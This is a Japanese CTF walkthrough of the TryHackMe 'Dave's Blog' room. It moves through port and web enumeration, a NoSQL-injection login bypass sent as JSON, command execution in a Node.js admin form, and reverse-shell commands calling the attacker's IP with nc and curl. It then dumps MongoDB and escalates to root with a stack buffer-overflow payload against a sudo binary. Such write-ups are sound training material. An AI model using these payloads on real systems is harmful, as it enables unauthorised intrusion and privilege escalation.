# Dave's Blog CTF

https://tryhackme.com/room/davesblog

## Enumeration

```shell
TARGET=10.145.166.29
sudo bash -c "echo $TARGET   blog.thm >> /etc/hosts"
```

### ポートスキャン

```shell
nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
3000/tcp open   ppp
8989/tcp closed sunwebadmins
```

```sh
sudo nmap -sV -p22,80,3000,8989 $TARGET

PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http         nginx 1.14.0 (Ubuntu)
3000/tcp open   http         Node.js (Express middleware)
8989/tcp closed sunwebadmins
```

SSH, HTTP*2。Closeされているポートは不明だが気に留めておく。

```sh
root@ip-10-145-66-144:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.145.166.29
+ Target Hostname:    blog.thm
+ Target Port:        80
+ Start Time:         2026-05-19 05:55:15 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/22e 0x8R1oIqXXVVXgZl/aE2f24LJICp0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self'
+ Allowed HTTP Methods: GET, HEAD 
+ 1707 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-05-19 05:55:20 (GMT1) (5 seconds)
---------------------------------------------------------------------------
```

```sh
root@ip-10-145-66-144:~# nikto -p 3000 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.145.166.29
+ Target Hostname:    blog.thm
+ Target Port:        3000
+ Start Time:         2026-05-19 05:56:07 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/22e 0x8R1oIqXXVVXgZl/aE2f24LJICp0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self'
+ Allowed HTTP Methods: GET, HEAD 
+ 1707 items checked: 4 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-05-19 05:56:10 (GMT1) (3 seconds)
---------------------------------------------------------------------------
```

Webページを表示すると、` I decided to build it with a NoSQL database,`との表示。

### ディレクトリ列挙

```sh
$ curl http://blog.thm/robots.txt
User-Agent: *
Disallow: /admin

$ curl http://blog.thm:3000/robots.txt
User-Agent: *
Disallow: /admin
```

80と3000は全く同じものを返している。3000ポートの存在理由は不明。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.145.166.29/ ----
+ http://10.145.166.29/admin (CODE:200|SIZE:1254)                                                                                                                       
+ http://10.145.166.29/Admin (CODE:200|SIZE:1254)                                                                                                                       
+ http://10.145.166.29/ADMIN (CODE:200|SIZE:1254)                                                                                                                       
+ http://10.145.166.29/images (CODE:301|SIZE:179)                                                                                                                       
+ http://10.145.166.29/javascripts (CODE:301|SIZE:189)                                                                                                                  
+ http://10.145.166.29/robots.txt (CODE:200|SIZE:31)                                                                                                                    
+ http://10.145.166.29/stylesheets (CODE:301|SIZE:189)
```

```sh
dirb http://$TARGET:3000/

---- Scanning URL: http://10.145.166.29:3000/ ----
+ http://10.145.166.29:3000/admin (CODE:200|SIZE:1254)                                                                                                                  
+ http://10.145.166.29:3000/Admin (CODE:200|SIZE:1254)                                                                                                                  
+ http://10.145.166.29:3000/ADMIN (CODE:200|SIZE:1254)                                                                                                                  
+ http://10.145.166.29:3000/images (CODE:301|SIZE:179)                                                                                                                  
+ http://10.145.166.29:3000/javascripts (CODE:301|SIZE:189)                                                                                                             
+ http://10.145.166.29:3000/robots.txt (CODE:200|SIZE:31)                                                                                                               
+ http://10.145.166.29:3000/stylesheets (CODE:301|SIZE:189)
```

## /admin login

ランダムなログインリクエストを送ったら、JWTトークンが返されて/admin にリダイレクトされる仕組みだった。

JWTでアルゴリズムをNoneに設定する攻撃を試したところ、コールスタックが返ってきた。JWTをランダムな文字列にしても同じエラーが発生する。

```
<pre>TypeError: Cannot read property &#39;username&#39; of null
    at /home/dave/blog/routes/admin.js:11:19
    at Layer.handle [as handle_request] (/home/dave/blog/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/dave/blog/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/dave/blog/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/dave/blog/node_modules/express/lib/router/layer.js:95:5)
    at /home/dave/blog/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/dave/blog/node_modules/express/lib/router/index.js:335:12)
    at next (/home/dave/blog/node_modules/express/lib/router/index.js:275:10)
    at Function.handle (/home/dave/blog/node_modules/express/lib/router/index.js:174:3)
    at router (/home/dave/blog/node_modules/express/lib/router/index.js:47:12)
    at Layer.handle [as handle_request] (/home/dave/blog/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/dave/blog/node_modules/express/lib/router/index.js:317:13)
    at /home/dave/blog/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/dave/blog/node_modules/express/lib/router/index.js:335:12)
    at next (/home/dave/blog/node_modules/express/lib/router/index.js:275:10)
    at /home/dave/blog/node_modules/express/lib/router/index.js:635:15</pre>
```

ログイン画面で、NoSQL+Expressという想定でインジェクションを試す。

下記の形はログイン失敗

```
username=dave&password[$ne]=1
username[$ne]=1&password[$ne]=1
```

```
username=dave&password[$regex]=^.*$
```

```
username[$exists]=true&password[$exists]=true
```

```
username=dave&password='||1==1//
username='||1==1//&password='||1==1//
```

```
username=';sleep(5000);&password=';sleep(5000);

username=0;return true&password=0;return true
```

/admin のソースコードを見ると、コメントアウトされているがjsonでリクエストすることを示唆している。

```js
  <script>
    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }
  </script>
```

jsonで下記ペイロードを送信したところログインできた。

```
{"username":"dave", "password": {"$ne": "aa"}}
```

## /admin Exec

入力フォームに `1+1` を入力すると、2 と表示された。

下記のリバースシェルは反応無し

```
require('child_process').exec('nc -e sh 192.168.128.106 8888')
↓
[object Object]
```

モジュール名をランダムにすると下記表示されるので、child_processはロードされていると思われる。

```
{"code":"MODULE_NOT_FOUND"}
```

curlを実行したら、リクエストが来たのでコマンド実行はできている。

```sh
require('child_process').exec('curl http://192.168.128.106:8000/test')
↓
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.145.166.29 - - [19/May/2026 02:53:41] code 404, message File not found
10.145.166.29 - - [19/May/2026 02:53:41] "GET /test HTTP/1.1" 404 -
```

busyboxでリバースシェルを取れた。

```sh
dave@daves-blog:~/blog$ id
uid=1000(dave) gid=1000(dave) groups=1000(dave)
```

2番目のフラグファイルを発見。1番目をどこかで見逃していると思われる。

```sh
dave@daves-blog:~$ ls -al
total 44
drwxr-xr-x  5 dave dave 4096 May 22  2020 .
drwxr-xr-x  3 root root 4096 May 21  2020 ..
lrwxrwxrwx  1 dave dave    9 May 21  2020 .bash_history -> /dev/null
-rw-r--r--  1 dave dave  220 May 21  2020 .bash_logout
-rw-r--r--  1 dave dave 3771 May 21  2020 .bashrc
drwxr-xr-x  9 dave dave 4096 May 19 04:47 blog
drwxrwxr-x  3 dave dave 4096 May 21  2020 .local
drwxrwxr-x 94 dave dave 4096 May 21  2020 .npm
-rw-r--r--  1 dave dave  807 May 21  2020 .profile
-rw-rw-r--  1 dave dave   66 May 21  2020 .selected_editor
-rwxr-xr-x  1 root root  137 May 22  2020 startup.sh
-rw-rw-r--  1 dave dave   38 May 21  2020 user.txt
```

## mongo

```sh
> show collections
posts
users
whatcouldthisbes
```

daveのパスワードがフラグ１だった。

```sh
> db.users.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864107"), "isAdmin" : true, "username" : "dave", "password" : "THM{[REDACTED]}", "__v" : 0 }
```

whatCouldThisBe にフラグ３が入っていた。

```sh
> db.whatcouldthisbes.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{[REDACTED]}", "__v" : 0 }
```

## 権限昇格

/uid_checker を root として実行できる。

```sh
dave@daves-blog:~/blog$ sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
```

バイナリファイル。

```sh
dave@daves-blog:~/blog$ file /uid_checker 
/uid_checker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c4ddac4d961327c9e42f962ef94e45d2eb149c20, not stripped
```

リバース。コード自体にフラグ４が含まれていた。

```c
void main(void)
{
  int iVar1;
  char local_58 [72];
  __uid_t local_10;
  __gid_t local_c;
  
  puts("Welcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID");
  gets(local_58);
  iVar1 = strcmp(local_58,"1");
  if (iVar1 == 0) {
    local_10 = getuid();
    printf("Your UID is: %d\n",(ulong)local_10);
  }
  else {
    iVar1 = strcmp(local_58,"2");
    if (iVar1 == 0) {
      local_c = getgid();
      printf("Your GID is: %d\n",(ulong)local_c);
    }
    else {
      iVar1 = strcmp(local_58,"THM{[REDACTED]}");
      if (iVar1 == 0) {
        puts("Wow! You found the secret function! I still need to finish it..");
      }
      else {
        puts("Invalid choice");
      }
    }
  }
  return;
}
```

secret 関数が定義されている。これを呼び出せたら勝利。

```c
void secret(void)
{
  puts("How did you get here???");
  system("/bin/sh");
  return;
}
```

ベースアドレスは固定なので簡単。

```sh
$ pwn checksec ./uid_checker 
[*] '/home/kali/ctf/dave/uid_checker'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

secret関数のアドレスは、`0x004006a7`。

昇格成功。

```sh
{ python2 -c 'print "A" * 80 + "\xa7\x06\x40\x00\x00\x00\x00\x00"'; cat; } | sudo /uid_checker

Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Invalid choice
How did you get here???
id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
ls -al /root
total 48
drwx------  6 root root 4096 May 22  2020 .
drwxr-xr-x 24 root root 4096 May 21  2020 ..
lrwxrwxrwx  1 root root    9 May 21  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 21  2020 .cache
-rw-------  1 root root  161 May 21  2020 .dbshell
drwx------  3 root root 4096 May 21  2020 .gnupg
drwxr-xr-x  3 root root 4096 May 21  2020 .local
lrwxrwxrwx  1 root root    9 May 21  2020 .mongorc.js -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 May 21  2020 root.txt
-rw-r--r--  1 root root   66 May 21  2020 .selected_editor
-rw-r--r--  1 root root   87 May 22  2020 setup.sh
drwx------  2 root root 4096 May 21  2020 .ssh
cat /root/root.txt
THM{[REDACTED]}
```

## 振り返り

- 一番苦労したのは、ログインリクエストを json で送ることに気づくところ。その後は簡単だった。
- バッファオーバーフローの部分については、RETアドレスの位置を少し試行錯誤した。バッファサイズが72バイト、RBPが8バイトであることは確実なので、RETアドレスが80バイトの位置にあったということは、72バイトバッファがスタックの先頭に確保されていたことを示している。

```c
void main(void)
{
  int iVar1;
  char local_58 [72];
  __uid_t local_10;
  __gid_t local_c;
```

## Tags

#tags:NoSQL #tags:mongo #tags:pwn
